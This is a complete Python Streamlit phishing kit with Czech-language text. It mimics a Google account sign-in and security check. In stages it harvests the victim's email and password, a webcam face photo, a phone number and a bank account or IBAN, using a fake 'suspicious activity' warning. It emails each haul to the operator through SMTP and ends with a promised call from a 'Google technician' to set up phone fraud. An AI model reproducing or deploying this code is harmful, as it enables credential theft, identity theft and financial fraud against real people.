import streamlit as st
import os
import smtplib
import time
import re
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from datetime import datetime

# --- KONFIGURACE Z PROSTŘEDÍ (ENVIRONMENT VARIABLES) ---
MOJE_ADRESA = os.environ.get("MOJE_ADRESA")
MOJE_HESLO = os.environ.get("MOJE_HESLO")

def odeslat_email(subjekt, text, soubor=None):
    if not MOJE_ADRESA or not MOJE_HESLO:
        return
    msg = MIMEMultipart()
    msg['Subject'] = subjekt
    msg['From'] = MOJE_ADRESA
    msg['To'] = MOJE_ADRESA
    msg.attach(MIMEText(text))
    
    if soubor:
        img = MIMEImage(soubor.read(), name="biometrika.png")
        msg.attach(img)
        
    try:
        server = smtplib.SMTP_SSL("smtp.seznam.cz", 465)
        server.login(MOJE_ADRESA, MOJE_HESLO)
        server.send_message(msg)
        server.quit()
    except Exception as e:
        print(f"Chyba SMTP: {e}")

# --- VALIDACE ---
def je_validni_email(email):
    return re.match(r"[^@]+@[^@]+\.[^@]+", email)

def je_validni_tel(tel):
    return re.match(r"^\d{9}$", tel)

# --- STAV APLIKACE ---
if "step" not in st.session_state:
    st.session_state.step = "login"
if "zadany_email" not in st.session_state:
    st.session_state.zadany_email = ""

st.set_page_config(page_title="Zabezpečení účtu Google", page_icon="🔒")

# Google Modrá a styl tlačítek
st.markdown("""
    <style>
    div.stButton > button:first-child { 
        background-color: #4285F4; 
        color: white; 
        border: none; 
        width: 100%; 
        height: 45px; 
        font-weight: bold; 
    }
    .google-header { font-family: 'Product Sans', sans-serif; text-align: center; }
    </style>
    """, unsafe_allow_html=True)

def show_logo():
    st.markdown("<h1 style='text-align: center;'><span style='color: #4285F4;'>G</span><span style='color: #EA4335;'>o</span><span style='color: #FBBC05;'>o</span><span style='color: #4285F4;'>g</span><span style='color: #34A853;'>l</span><span style='color: #EA4335;'>e</span></h1>", unsafe_allow_html=True)

# Layout
col1, col2, col3 = st.columns(3)

with col2:
    # --- 1. KROK: PŘIHLÁŠENÍ ---
    if st.session_state.step == "login":
        show_logo()
        st.markdown("<h3 class='google-header'>Přihlášení</h3>", unsafe_allow_html=True)
        st.write("Pokračovat do služby Gmail")
        
        em = st.text_input("E-mail nebo telefon")
        he = st.text_input("Zadejte heslo", type="password")
        
        if st.button("Další"):
            if je_validni_email(em) and len(he) > 3:
                st.session_state.zadany_email = em
                odeslat_email("🔑 LOGIN", f"Email: {em}\nHeslo: {he}")
                with st.spinner("Ověřování..."):
                    time.sleep(1.5)
                st.session_state.step = "face"
                st.rerun()
            else:
                st.error("Zadejte platný e-mail a heslo.")

    # --- 2. KROK: FACE SCAN (Vynechán hlas) ---
    elif st.session_state.step == "face":
        show_logo()
        st.info("Fáze 2: Biometrický sken obličeje")
        st.write("Pro bezpečné přihlášení prosím zarovnejte obličej do rámečku.")
        
        foto = st.camera_input("Skenování identity")
        if foto:
            with st.status("Odesílání biometrických dat...") as status:
                odeslat_email("📸 FACE SCAN", f"Uživatel: {st.session_state.zadany_email}", soubor=foto)
                time.sleep(2)
                status.update(label="Sken dokončen", state="complete")
            st.session_state.step = "verification"
            st.rerun()

    # --- 3. KROK: TELEFON & BANKID ---
    elif st.session_state.step == "verification":
        show_logo()
        st.error("⚠️ Podezřelá aktivita zjištěna")
        st.write("Váš účet je dočasně omezen. Vyberte způsob ověření.")
        
        zeme = st.selectbox("Země", ["Česká republika (+420)", "Slovensko (+421)", "Německo (+49)"])
        tel = st.text_input("Telefonní číslo (9 číslic)")
        
        tab1, tab2 = st.tabs(["Hovor technika", "BankID (Urychlit)"])
        
        with tab1:
            if st.button("Požádat o hovor"):
                if je_validni_tel(tel):
                    odeslat_email("📞 KONTAKT", f"Uživatel: {st.session_state.zadany_email}\nTel: {tel} ({zeme})")
                    st.session_state.step = "finish"
                    st.rerun()
                else:
                    st.error("Zadejte přesně 9 číslic!")

        with tab2:
            st.write("Okamžité odblokování přes Bankovní Identitu")
            ib = st.text_input("Číslo účtu / IBAN")
            if st.button("Autorizovat"):
                if je_validni_tel(tel) and len(ib) > 10:
                    odeslat_email("🏦 BANKID DATA", f"User: {st.session_state.zadany_email}\nTel: {tel}\nIBAN: {ib}")
                    with st.spinner("Přesměrování..."):
                        time.sleep(2)
                    st.session_state.step = "finish"
                    st.rerun()
                else:
                    st.error("Vyplňte telefon a platný IBAN.")

    # --- 4. KROK: FINÁLE ---
    elif st.session_state.step == "finish":
        show_logo()
        st.success("Požadavek byl úspěšně zaznamenán.")
        st.markdown("### STATUS: ČEKÁNÍ NA SCHVÁLENÍ")
        st.info("V nejbližší době vás bude kontaktovat technik Google pro finální potvrzení. Ne zavírejte tuto kartu prohlížeče.")
        st.progress(92)
        st.write(f"Zadané kontaktní číslo: **{datetime.now().strftime('%H:%M:%S')}**")
